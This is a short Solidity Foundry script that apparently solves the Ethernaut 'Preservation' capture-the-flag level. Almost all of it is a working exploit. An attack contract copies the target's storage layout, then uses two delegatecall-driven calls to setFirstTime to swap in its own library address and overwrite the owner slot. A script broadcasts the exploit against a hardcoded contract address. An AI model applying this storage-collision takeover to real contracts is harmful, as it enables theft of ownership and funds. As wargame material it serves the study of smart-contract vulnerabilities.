// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PreservationAttack {

    // Keep the storage layout the same as preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation preservation = Preservation(0xD406B6B9596647631709045d24532154747217BE);

    function exploit() external {
        // Call delegate call with this contracts address to change preservation storage to point to this address
        preservation.setFirstTime(uint256(uint160(address(this))));
        // Call delegate call again to change the owner storage slot to msg.sender
        // Cast address -> uint160 -> uint256
        preservation.setFirstTime(uint256(uint160(msg.sender)));
        require(preservation.owner() == msg.sender);
    }

    function setTime(uint256 _owner) public {
        // Change owner storage slot
        // Cast address -> uint160 -> uint256
        owner = address(uint160(_owner));
    }

}

contract PreservationSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        PreservationAttack preservationAttack = new PreservationAttack();
        preservationAttack.exploit();
        vm.stopBroadcast();
    }
}